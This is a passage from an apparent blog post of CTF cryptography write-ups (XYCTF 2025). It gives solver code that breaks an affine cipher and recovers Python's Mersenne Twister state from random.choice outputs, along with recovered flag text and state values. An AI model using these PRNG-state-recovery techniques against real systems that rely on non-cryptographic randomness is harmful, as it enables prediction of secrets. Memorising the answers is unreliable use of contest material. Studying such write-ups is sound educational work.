operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits\n\nr <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">PRNG</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1145140</span>\n        self<span class=\"token punctuation\">.</span>b <span class=\"token operator\">=</span> <span class=\"token number\">19198100</span>\n        random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        x <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span>\n        random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>x <span class=\"token operator\">**</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> x\n    \n    <span class=\"token keyword\">def</span> <span class=\"token function\">round</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            x <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> x\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">*</span> table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> b<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">19198111</span> <span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> msg<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> c\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nenc<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9474070</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15547185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9474070</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6914981</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5936215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1042385</span><span class=\"token punctuation\">,</span> <span class=\"token number\">841866</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13966862</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10051798</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3978683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5936215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17103679</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15146147</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5936215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9073032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9073032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3978683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13966862</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14945628</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17103679</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12988096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">841866</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2999917</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3978683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2021151</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9073032</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1443423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1443423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14568419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10452836</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4379721</span><span class=\"token punctuation\">]</span>\n\nprng <span class=\"token operator\">=</span> PRNG<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\nflag<span class=\"token operator\">=</span><span class=\"token string\">'114'</span>\n\nencc<span class=\"token operator\">=</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\ninv_e<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">19198111</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>inv_e<span class=\"token punctuation\">)</span>\n\namod<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inv_e<span class=\"token operator\">%</span><span class=\"token number\">19198111</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>amod<span class=\"token punctuation\">)</span>\ninv_a<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>amod<span class=\"token punctuation\">,</span><span class=\"token number\">19198111</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>inv_a<span class=\"token punctuation\">)</span>\nb<span class=\"token operator\">=</span>enc<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>amod<span class=\"token operator\">*</span>table<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">19198111</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> enc<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">-</span>b<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>inv_a<span class=\"token operator\">%</span><span class=\"token number\">19198111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n\n</code></pre>\n\n<p>114514fixedpointissodangerous1919810</p>\n<h3 id=\"choice\"><a href=\"#choice\" class=\"headerlink\" title=\"choice\"></a>choice</h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> Random\n<span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag\n\n<span class=\"token keyword\">assert</span> flag<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">b'XYCTF&#123;'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> flag<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">b'&#125;'</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n\nmsg <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\nrand <span class=\"token operator\">=</span> Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntest <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'output.py'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>msg <span class=\"token operator\">^</span> rand<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\nr = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">[</span>rand<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2496</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可</p>\n<p>m长度可能与e有偏差，多试两位即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">from</span> tqdm <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    e<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    r<span class=\"token operator\">=</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\ntest <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nDall<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">:</span>\n    Dall<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nf<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nn<span class=\"token operator\">=</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>Dall<span class=\"token punctuation\">)</span>\nD<span class=\"token operator\">=</span>Dall\nrng<span class=\"token operator\">=</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getRows</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。</span>\n    row<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        row<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> row\nM<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#这一部分为固定套路，具体原因已经写在注释中了</span>\n\n    state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">624</span>\n    temp <span class=\"token operator\">=</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span>i <span class=\"token operator\">+</span> <span class=\"token string\">\"1\"</span><span class=\"token operator\">*</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        state<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    rng<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#这个setstate也是固定格式，已于2025.1.21测试</span>\n    M<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>getRows<span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\nM<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>M<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">.</span>rank<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\ny<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    y<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------------------------------------------'</span><span class=\"token punctuation\">)</span>\n\ny<span class=\"token operator\">=</span>vector<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\ns<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>solve_left<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n\n\nG<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    C<span class=\"token operator\">=</span><span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        C<span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n        C<span class=\"token operator\">|</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    G<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">import</span> random\nRNG1 <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\"># G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 